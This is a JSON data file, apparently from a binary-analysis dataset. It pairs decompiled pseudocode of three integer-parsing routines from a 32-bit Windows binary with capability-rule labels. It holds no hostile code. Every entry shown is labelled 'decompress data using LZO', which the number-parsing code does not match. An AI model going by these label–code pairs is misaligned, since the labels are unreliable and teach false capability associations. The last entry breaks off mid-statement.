    "00449be0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00449be0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    char cVar5;\n    char cVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint s;\n    uint var_4ch;\n    uint8_t var_45h;\n    uint *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar12 = arg_18h;\n    iVar9 = fcn.0042e410(arg_18h + 0x6c);\n    uVar10 = *(iVar12 + 0xc) & 0x4a;\n    if (uVar10 == 0x40) {\n        var_38h = 8;\ncode_r0x00449c20:\n        cVar5 = fcn.00430ce0(&arg_10h);\n        if (cVar5 == '\\0') {\ncode_r0x00449c3f:\n            var_44h = &arg_10h;\n            uVar11 = fcn.00430dd0();\n            cVar6 = uVar11;\n            bVar15 = *(iVar9 + 0x4a) == cVar6;\n            cVar5 = *(iVar9 + 0x10);\n            if ((((bVar15) || (*(iVar9 + 0x4b) == cVar6)) && ((cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)))) &&\n               (*(iVar9 + 0x24) != cVar6)) {\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                cVar5 = fcn.00430ce0(var_44h);\n                var_34h = 0;\n                bVar2 = false;\n                if (cVar5 == '\\0') {\n                    uVar11 = fcn.00430dd0();\n                    cVar5 = *(iVar9 + 0x10);\n                    goto code_r0x00449e4c;\n                }\n            }\n            else {\ncode_r0x00449e4c:\n                var_34h = 0;\n                bVar2 = false;\n                while (((cVar6 = uVar11,  cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)) && (*(iVar9 + 0x24) != cVar6))) {\n                    if (*(iVar9 + 0x4e) == cVar6) {\n                        bVar7 = var_38h == 10 | bVar2 ^ 1U;\n                        if (!bVar7) goto code_r0x00449e89;\n                        bVar2 = uVar10 == 0 || var_38h == 8;\n                        if (uVar10 != 0 && var_38h != 8) {\n                            var_34h = var_34h + 1;\n                            goto code_r0x00449ebd;\n                        }\n                        var_34h = 0;\n                        var_38h = 8;\n                        uVar13 = arg_8h[2];\n                        if (arg_8h[3] <= uVar13) goto code_r0x00449f60;\ncode_r0x00449ecc:\n                        arg_8h[2] = uVar13 + 1;\ncode_r0x00449ed9:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar12 = (**(*arg_8h + 0x24))(),  iVar12 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00449e89:\n                        if ((*(iVar9 + 0x4c) != cVar6) && (*(iVar9 + 0x4d) != cVar6)) {\n                            cVar5 = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00449cb1;\n                        }\n                        cVar5 = var_38h == 0x10 || uVar10 == 0;\n                        if (var_38h != 0x10 && uVar10 != 0) {\n                            bVar2 = true;\n                            goto code_r0x00449cbe;\n                        }\n                        var_34h = 0;\n                        var_38h = 0x10;\n                        bVar7 = false;\ncode_r0x00449ebd:\n                        uVar13 = arg_8h[2];\n                        bVar2 = bVar7;\n                        if (uVar13 < arg_8h[3]) goto code_r0x00449ecc;\ncode_r0x00449f60:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00449ed9;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar7 = arg_10h != NULL && arg_14h == -1;\n                    var_45h = arg_14h == -1;\n                    if ((bVar7) && (var_45h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_45h = false;\n                        iVar12 = (**(*arg_10h + 0x24))();\n                        if (iVar12 == -1) {\n                            arg_10h = NULL;\n                            var_45h = bVar7;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_45h) {\n                        cVar5 = '\\x01';\n                        goto code_r0x00449cb1;\n                    }\n                    uVar11 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                            if (uVar11 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar11 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar5 = *(iVar9 + 0x10);\n                }\n                cVar5 = '\\0';\n            }\ncode_r0x00449cb1:\n            var_40h = 0x16;\n            if (var_38h == 0x10) goto code_r0x00449cc4;\n        }\n        else {\n            uVar11 = 0;\n            var_34h = 0;\n            bVar2 = false;\n            bVar15 = false;\n        }\ncode_r0x00449cbe:\n        var_40h = var_38h;\n    }\n    else {\n        if (uVar10 != 8) {\n            var_38h = 10;\n            goto code_r0x00449c20;\n        }\n        cVar5 = fcn.00430ce0(&arg_10h);\n        if (cVar5 == '\\0') {\n            var_38h = 0x10;\n            goto code_r0x00449c3f;\n        }\n        uVar11 = 0;\n        var_34h = 0;\n        bVar2 = false;\n        bVar15 = false;\n        var_38h = 0x10;\n        var_40h = 0x16;\n    }\ncode_r0x00449cc4:\n    var_44h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar9 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar10 = 0xffffffff / var_38h;\n    uVar1 = *(iVar9 + 100);\n    cVar6 = cVar5;\n    if (uVar1 == 0) {\n        var_45h = 0;\n        if (cVar5 == '\\0') {\n            uVar13 = 0;\n            do {\n                cVar6 = uVar11;\n                iVar12 = cVar6;\n                if (var_40h < 0xb) {\n                    if ((cVar6 < '0') || (var_40h + '0' <= cVar6)) goto code_r0x00449fd4;\ncode_r0x00449d41:\n                    uVar11 = iVar12 - 0x30;\n                }\n                else {\n                    if (cVar6 - 0x30U < 10) goto code_r0x00449d41;\n                    if (cVar6 + 0x9fU < 6) {\n                        uVar11 = iVar12 - 0x57;\n                    }\n                    else {\n                        if (5 < cVar6 + 0xbfU) goto code_r0x00449fd4;\n                        uVar11 = iVar12 - 0x37;\n                    }\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x00449fd4;\n                if (uVar10 < uVar13) {\n                    var_45h = 1;\n                    uVar11 = arg_8h[2];\n                    if (arg_8h[3] <= uVar11) goto code_r0x0044a073;\ncode_r0x00449d7b:\n                    arg_8h[2] = uVar11 + 1;\n                }\n                else {\n                    uVar14 = uVar13 * var_38h;\n                    uVar13 = uVar14 + uVar11;\n                    var_45h = var_45h | ~uVar11 < uVar14;\n                    uVar11 = arg_8h[2];\n                    var_34h = var_34h + 1;\n                    if (uVar11 < arg_8h[3]) goto code_r0x00449d7b;\ncode_r0x0044a073:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                cVar6 = fcn.00430ce0(var_44h);\n                cVar8 = cVar5;\n                if (cVar6 != '\\0') goto code_r0x00449da3;\n                uVar11 = fcn.00430dd0();\n            } while( true );\n        }\n        uVar13 = 0;\n        cVar8 = '\\0';\ncode_r0x00449da3:\n        cVar3 = cVar6;\n        cVar5 = cVar8;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00449db1;\ncode_r0x00449fe4:\n        cVar6 = cVar3;\n        fcn.0046d560(var_34h);\n        cVar8 = fcn.0049e880(*(iVar9 + 8), *(iVar9 + 0xc), &var_1eh + 2);\n        if (cVar8 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_34h != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0044a032;\n    }\n    else {\n        if (cVar5 != '\\0') {\n            uVar13 = 0;\n            var_45h = 0;\n            cVar8 = '\\0';\n            goto code_r0x00449da3;\n        }\n        var_45h = 0;\n        uVar13 = 0;\n        cVar8 = *(iVar9 + 0x10);\n        if ((cVar8 != '\\0') && (*(iVar9 + 0x25) == uVar11)) goto code_r0x0044a1e0;\ncode_r0x0044a137:\n        if ((uVar11 != *(iVar9 + 0x24)) && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x4e, uVar11, var_40h),  iVar12 != 0)\n           ) {\n            uVar11 = iVar12 - (iVar9 + 0x4e);\n            if (0xf < uVar11) {\n                uVar11 = uVar11 - 6;\n            }\n            uVar4 = uVar1;\n            if (uVar13 <= uVar10) {\n                uVar14 = uVar13 * var_38h;\n                var_34h = var_34h + 1;\n                uVar13 = uVar14 + uVar11;\n                uVar4 = var_45h | ~uVar11 < uVar14;\n            }\n            var_45h = uVar4;\n            uVar11 = arg_8h[2];\n            if (arg_8h[3] <= uVar11) goto code_r0x0044a20e;\n            do {\n                arg_8h[2] = uVar11 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar6 = fcn.00430ce0(var_44h);\n                    cVar8 = cVar5;\n                    if (cVar6 != '\\0') goto code_r0x00449da3;\n                    uVar11 = fcn.00430dd0();\n                    cVar8 = *(iVar9 + 0x10);\n                    if ((cVar8 == '\\0') || (*(iVar9 + 0x25) != uVar11)) goto code_r0x0044a137;\ncode_r0x0044a1e0:\n                    if (var_34h == 0) {\n                        cVar6 = '\\0';\n                        goto code_r0x00449da3;\n                    }\n                    fcn.0046d560(var_34h);\n                    var_34h = 0;\n                    uVar11 = arg_8h[2];\n                    if (uVar11 < arg_8h[3]) break;\ncode_r0x0044a20e:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x00449fd4:\n        cVar6 = '\\0';\n        cVar3 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00449fe4;\ncode_r0x00449db1:\n        if ((var_34h != 0) || (bVar2)) {\ncode_r0x0044a032:\n            if (cVar5 == '\\0') {\n                if (var_45h == 0) {\n                    if (bVar15) {\n                        uVar13 = -uVar13;\n                    }\n                    *arg_20h = uVar13;\n                }\n                else {\n                    *arg_20h = 0xffffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x00449dd8;\n            }\n        }\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00449dd8:\n    if (cVar6 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3636
    },
    "0044a370": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044a370(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    char cVar5;\n    char cVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint16_t uVar14;\n    int32_t iVar15;\n    bool bVar16;\n    uint var_50h;\n    uint var_4ch;\n    uint8_t var_45h;\n    uint *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar15 = arg_18h;\n    iVar9 = fcn.0042e410(arg_18h + 0x6c);\n    uVar10 = *(iVar15 + 0xc) & 0x4a;\n    if (uVar10 == 0x40) {\n        var_38h = 8;\ncode_r0x0044a3b0:\n        cVar5 = fcn.00430ce0(&arg_10h);\n        if (cVar5 == '\\0') {\ncode_r0x0044a3cf:\n            var_44h = &arg_10h;\n            uVar11 = fcn.00430dd0();\n            cVar6 = uVar11;\n            bVar16 = *(iVar9 + 0x4a) == cVar6;\n            cVar5 = *(iVar9 + 0x10);\n            if ((((bVar16) || (*(iVar9 + 0x4b) == cVar6)) && ((cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)))) &&\n               (*(iVar9 + 0x24) != cVar6)) {\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                cVar5 = fcn.00430ce0(var_44h);\n                var_34h = 0;\n                bVar2 = false;\n                if (cVar5 == '\\0') {\n                    uVar11 = fcn.00430dd0();\n                    cVar5 = *(iVar9 + 0x10);\n                    goto code_r0x0044a5e1;\n                }\n            }\n            else {\ncode_r0x0044a5e1:\n                var_34h = 0;\n                bVar2 = false;\n                while (((cVar6 = uVar11,  cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)) && (*(iVar9 + 0x24) != cVar6))) {\n                    if (*(iVar9 + 0x4e) == cVar6) {\n                        bVar7 = var_38h == 10 | bVar2 ^ 1U;\n                        if (!bVar7) goto code_r0x0044a61d;\n                        bVar2 = uVar10 == 0 || var_38h == 8;\n                        if (uVar10 != 0 && var_38h != 8) {\n                            var_34h = var_34h + 1;\n                            goto code_r0x0044a651;\n                        }\n                        var_34h = 0;\n                        var_38h = 8;\n                        uVar13 = arg_8h[2];\n                        if (arg_8h[3] <= uVar13) goto code_r0x0044a700;\ncode_r0x0044a660:\n                        arg_8h[2] = uVar13 + 1;\ncode_r0x0044a66d:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar15 = (**(*arg_8h + 0x24))(),  iVar15 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x0044a61d:\n                        if ((*(iVar9 + 0x4c) != cVar6) && (*(iVar9 + 0x4d) != cVar6)) {\n                            cVar5 = '\\0';\n                            bVar2 = true;\n                            goto code_r0x0044a441;\n                        }\n                        cVar5 = var_38h == 0x10 || uVar10 == 0;\n                        if (var_38h != 0x10 && uVar10 != 0) {\n                            bVar2 = true;\n                            goto code_r0x0044a44e;\n                        }\n                        var_34h = 0;\n                        var_38h = 0x10;\n                        bVar7 = false;\ncode_r0x0044a651:\n                        uVar13 = arg_8h[2];\n                        bVar2 = bVar7;\n                        if (uVar13 < arg_8h[3]) goto code_r0x0044a660;\ncode_r0x0044a700:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044a66d;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar7 = arg_10h != NULL && arg_14h == -1;\n                    var_45h = arg_14h == -1;\n                    if ((bVar7) && (var_45h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_45h = false;\n                        iVar15 = (**(*arg_10h + 0x24))();\n                        if (iVar15 == -1) {\n                            arg_10h = NULL;\n                            var_45h = bVar7;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_45h) {\n                        cVar5 = '\\x01';\n                        goto code_r0x0044a441;\n                    }\n                    uVar11 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                            if (uVar11 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar11 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar5 = *(iVar9 + 0x10);\n                }\n                cVar5 = '\\0';\n            }\ncode_r0x0044a441:\n            var_40h = 0x16;\n            if (var_38h == 0x10) goto code_r0x0044a454;\n        }\n        else {\n            uVar11 = 0;\n            var_34h = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x0044a44e:\n        var_40h = var_38h;\n    }\n    else {\n        if (uVar10 != 8) {\n            var_38h = 10;\n            goto code_r0x0044a3b0;\n        }\n        cVar5 = fcn.00430ce0(&arg_10h);\n        if (cVar5 == '\\0') {\n            var_38h = 0x10;\n            goto code_r0x0044a3cf;\n        }\n        uVar11 = 0;\n        var_34h = 0;\n        bVar2 = false;\n        bVar16 = false;\n        var_38h = 0x10;\n        var_40h = 0x16;\n    }\ncode_r0x0044a454:\n    var_44h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar9 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar1 = *(iVar9 + 100);\n    var_4ch._0_2_ = 0xffff / var_38h;\n    cVar6 = cVar5;\n    if (uVar1 == 0) {\n        var_45h = 0;\n        if (cVar5 == '\\0') {\n            iVar15 = 0;\n            do {\n                uVar14 = iVar15;\n                cVar6 = uVar11;\n                iVar12 = cVar6;\n                if (var_40h < 0xb) {\n                    if ((cVar6 < '0') || (var_40h + '0' <= cVar6)) goto code_r0x0044a774;\ncode_r0x0044a4d0:\n                    iVar12 = iVar12 + -0x30;\n                }\n                else {\n                    if (cVar6 - 0x30U < 10) goto code_r0x0044a4d0;\n                    if (cVar6 + 0x9fU < 6) {\n                        iVar12 = iVar12 + -0x57;\n                    }\n                    else {\n                        if (5 < cVar6 + 0xbfU) goto code_r0x0044a774;\n                        iVar12 = iVar12 + -0x37;\n                    }\n                }\n                if (iVar12 == -1) goto code_r0x0044a774;\n                if (var_4ch < uVar14) {\n                    var_45h = 1;\n                    uVar10 = arg_8h[2];\n                    if (arg_8h[3] <= uVar10) goto code_r0x0044a813;\ncode_r0x0044a512:\n                    arg_8h[2] = uVar10 + 1;\n                }\n                else {\n                    iVar15 = uVar14 * var_38h + iVar12;\n                    var_45h = var_45h | 0xffff - iVar12 < uVar14 * var_38h;\n                    var_34h = var_34h + 1;\n                    uVar10 = arg_8h[2];\n                    if (uVar10 < arg_8h[3]) goto code_r0x0044a512;\ncode_r0x0044a813:\n                    (**(*arg_8h + 0x28))();\n                }\n                uVar14 = iVar15;\n                arg_ch = 0xffffffff;\n                cVar6 = fcn.00430ce0(var_44h);\n                cVar8 = cVar5;\n                if (cVar6 != '\\0') goto code_r0x0044a53a;\n                uVar11 = fcn.00430dd0();\n            } while( true );\n        }\n        uVar14 = 0;\n        cVar8 = '\\0';\ncode_r0x0044a53a:\n        cVar3 = cVar6;\n        cVar5 = cVar8;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0044a548;\ncode_r0x0044a784:\n        cVar6 = cVar3;\n        fcn.0046d560(var_34h);\n        cVar8 = fcn.0049e880(*(iVar9 + 8), *(iVar9 + 0xc), &var_1eh + 2);\n        if (cVar8 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_34h != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0044a7d2;\n    }\n    else {\n        if (cVar5 != '\\0') {\n            uVar14 = 0;\n            var_45h = 0;\n            cVar8 = '\\0';\n            goto code_r0x0044a53a;\n        }\n        var_45h = 0;\n        iVar15 = 0;\n        cVar8 = *(iVar9 + 0x10);\n        if ((cVar8 != '\\0') && (*(iVar9 + 0x25) == uVar11)) goto code_r0x0044a988;\ncode_r0x0044a8d7:\n        uVar14 = iVar15;\n        if ((uVar11 != *(iVar9 + 0x24)) && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x4e, uVar11, var_40h),  iVar12 != 0)\n           ) {\n            iVar12 = iVar12 - (iVar9 + 0x4e);\n            if (0xf < iVar12) {\n                iVar12 = iVar12 + -6;\n            }\n            uVar4 = uVar1;\n            if (uVar14 <= var_4ch) {\n                var_34h = var_34h + 1;\n                iVar15 = uVar14 * var_38h + iVar12;\n                uVar4 = var_45h | 0xffff - iVar12 < uVar14 * var_38h;\n            }\n            var_45h = uVar4;\n            uVar10 = arg_8h[2];\n            if (arg_8h[3] <= uVar10) goto code_r0x0044a9b6;\n            do {\n                arg_8h[2] = uVar10 + 1;\n                while( true ) {\n                    uVar14 = iVar15;\n                    arg_ch = 0xffffffff;\n                    cVar6 = fcn.00430ce0(var_44h);\n                    cVar8 = cVar5;\n                    if (cVar6 != '\\0') goto code_r0x0044a53a;\n                    uVar11 = fcn.00430dd0();\n                    cVar8 = *(iVar9 + 0x10);\n                    if ((cVar8 == '\\0') || (*(iVar9 + 0x25) != uVar11)) goto code_r0x0044a8d7;\ncode_r0x0044a988:\n                    uVar14 = iVar15;\n                    if (var_34h == 0) {\n                        cVar6 = '\\0';\n                        goto code_r0x0044a53a;\n                    }\n                    fcn.0046d560(var_34h);\n                    var_34h = 0;\n                    uVar10 = arg_8h[2];\n                    if (uVar10 < arg_8h[3]) break;\ncode_r0x0044a9b6:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x0044a774:\n        cVar6 = '\\0';\n        cVar3 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x0044a784;\ncode_r0x0044a548:\n        if ((var_34h != 0) || (bVar2)) {\ncode_r0x0044a7d2:\n            if (cVar5 == '\\0') {\n                if (var_45h == 0) {\n                    if (bVar16) {\n                        uVar14 = -uVar14;\n                    }\n                    *arg_20h = uVar14;\n                }\n                else {\n                    *arg_20h = 0xffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x0044a56e;\n            }\n        }\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0044a56e:\n    if (cVar6 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3704
    },
    "0044ab20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044ab20(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong uVar14;\n    int32_t var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint8_t var_33h;\n    uint8_t var_32h;\n    uint8_t var_31h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar8 = arg_18h;\n    iVar5 = fcn.0042e410(arg_18h + 0x6c);\n    uVar6 = *(iVar8 + 0xc) & 0x4a;\n    if (uVar6 == 0x40) {\n        var_40h = 8;\ncode_r0x0044ab5f:\n        var_32h = fcn.00430ce0(&arg_10h);\n        if (var_32h == 0) {\ncode_r0x0044ab7e:\n            var_48h = &arg_10h;\n            uVar7 = fcn.00430dd0();\n            cVar4 = uVar7;\n            bVar13 = *(iVar5 + 0x4a) == cVar4;\n            if (bVar13) {\n                cVar10 = *(iVar5 + 0x10);\ncode_r0x0044abae:\n                if (((cVar10 != '\\0') && (*(iVar5 + 0x25) == cVar4)) || (*(iVar5 + 0x24) == cVar4))\n                goto code_r0x0044afe7;\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                var_32h = fcn.00430ce0(var_48h);\n                var_38h = 0;\n                var_31h = false;\n                if (var_32h == 0) {\n                    uVar7 = fcn.00430dd0();\n                    cVar10 = *(iVar5 + 0x10);\n                    goto code_r0x0044afe7;\n                }\n            }\n            else {\n                cVar10 = *(iVar5 + 0x10);\n                if (*(iVar5 + 0x4b) == cVar4) goto code_r0x0044abae;\ncode_r0x0044afe7:\n                var_38h = 0;\n                var_31h = false;\n                while (((cVar4 = uVar7,  cVar10 == '\\0' || (*(iVar5 + 0x25) != cVar4)) && (*(iVar5 + 0x24) != cVar4))) {\n                    if (*(iVar5 + 0x4e) == cVar4) {\n                        var_31h = var_40h == 10 | var_31h ^ 1;\n                        if (var_31h == false) goto code_r0x0044b02f;\n                        bVar3 = uVar6 == 0 || var_40h == 8;\n                        if (uVar6 != 0 && var_40h != 8) {\n                            var_38h = var_38h + 1;\n                            goto code_r0x0044b063;\n                        }\n                        var_38h = 0;\n                        var_40h = 8;\n                        uVar11 = arg_8h[2];\n                        var_31h = bVar3;\n                        if (arg_8h[3] <= uVar11) {\n                            var_40h = 8;\n                            goto code_r0x0044b110;\n                        }\ncode_r0x0044b072:\n                        arg_8h[2] = uVar11 + 1;\ncode_r0x0044b07f:\n                        var_40h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar8 = (**(*arg_8h + 0x24))(),  iVar8 == -1)) {\n                            arg_8h = NULL;\n                            var_40h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (var_31h == false) break;\ncode_r0x0044b02f:\n                        if ((*(iVar5 + 0x4c) != cVar4) && (*(iVar5 + 0x4d) != cVar4)) {\n                            var_32h = 0;\n                            var_31h = true;\n                            goto code_r0x0044ac00;\n                        }\n                        var_32h = var_40h == 0x10 || uVar6 == 0;\n                        if (var_40h != 0x10 && uVar6 != 0) {\n                            var_31h = true;\n                            goto code_r0x0044ac0c;\n                        }\n                        var_38h = 0;\n                        var_40h = 0x10;\n                        var_31h = false;\ncode_r0x0044b063:\n                        uVar11 = arg_8h[2];\n                        if (uVar11 < arg_8h[3]) goto code_r0x0044b072;\ncode_r0x0044b110:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044b07f;\n                        var_40h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar3 = arg_10h != NULL && arg_14h == -1;\n                    var_33h = arg_14h == -1;\n                    if ((bVar3) && (var_33h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_33h = false;\n                        iVar8 = (**(*arg_10h + 0x24))();\n                        if (iVar8 == -1) {\n                            arg_10h = NULL;\n                            var_33h = bVar3;\n                        }\n                    }\n                    if (var_33h == var_40h._0_1_) {\n                        var_32h = 1;\n                        goto code_r0x0044ac00;\n                    }\n                    uVar7 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar7 = *arg_8h[2];\n                        }\n                        else {\n                            uVar7 = (**(*arg_8h + 0x24))();\n                            if (uVar7 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar7 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (var_31h == false) break;\n                    cVar10 = *(iVar5 + 0x10);\n                }\n                var_32h = 0;\n            }\ncode_r0x0044ac00:\n            var_44h = 0x16;\n            if (var_40h != 0x10) goto code_r0x0044ac0c;\n        }\n        else {\n            uVar7 = 0;\n            var_38h = 0;\n            var_31h = false;\n            bVar13 = false;\ncode_r0x0044ac0c:\n            var_44h = var_40h;\n        }\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        if (*(iVar5 + 0x10) != '\\0') {\ncode_r0x0044b310:\n            fcn.0046d280(0x20);\n        }\n        uVar1 = var_32h;\n        var_48h = &arg_10h;\n        var_58h = 0;\n        var_54h = -0x80000000;\n        if (!bVar13) {\n            var_58h = 0xffffffff;\n            var_54h = 0x7fffffff;\n        }\n        uVar14 = fcn.00418980(var_58h, var_54h, var_40h, 0);\n        uVar6 = uVar14 >> 0x20;\n        var_33h = *(iVar5 + 100);\n        if (var_33h == 0) {\n            if (var_32h == 0) {\n                var_33h = var_32h;\n                uVar11 = 0;\n                uVar12 = 0;\n                do {\n                    cVar4 = uVar7;\n                    iVar8 = cVar4;\n                    if (var_44h < 0xb) {\n                        if ((cVar4 < '0') || (var_44h + '0' <= cVar4)) goto code_r0x0044b190;\ncode_r0x0044acdf:\n                        uVar7 = iVar8 - 0x30;\n                    }\n                    else {\n                        if (cVar4 - 0x30U < 10) goto code_r0x0044acdf;\n                        uVar7 = iVar8 - 0x57;\n                        if (5 < cVar4 + 0x9fU) {\n                            if (5 < cVar4 + 0xbfU) goto code_r0x0044b190;\n                            uVar7 = iVar8 - 0x37;\n                        }\n                    }\n                    if (uVar7 == 0xffffffff) goto code_r0x0044b190;\n                    if (uVar6 < uVar12 || uVar6 - uVar12 < (uVar14 < uVar11)) {\n                        var_33h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x0044b245;\ncode_r0x0044ad42:\n                        arg_8h[2] = uVar7 + 1;\n                    }\n                    else {\n                        uVar9 = uVar11 * var_40h;\n                        uVar12 = (uVar11 * var_40h >> 0x20) + var_40h * uVar12;\n                        uVar11 = (var_54h - (uVar7 >> 0x1f)) - (var_58h < uVar7);\n                        var_33h = var_33h | (uVar11 < uVar12 || uVar11 - uVar12 < (var_58h - uVar7 < uVar9));\n                        uVar11 = uVar9 + uVar7;\n                        uVar12 = uVar12 + (uVar7 >> 0x1f) + CARRY4(uVar9, uVar7);\n                        var_38h = var_38h + 1;\n                        uVar7 = arg_8h[2];\n                        if (uVar7 < arg_8h[3]) goto code_r0x0044ad42;\ncode_r0x0044b245:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = 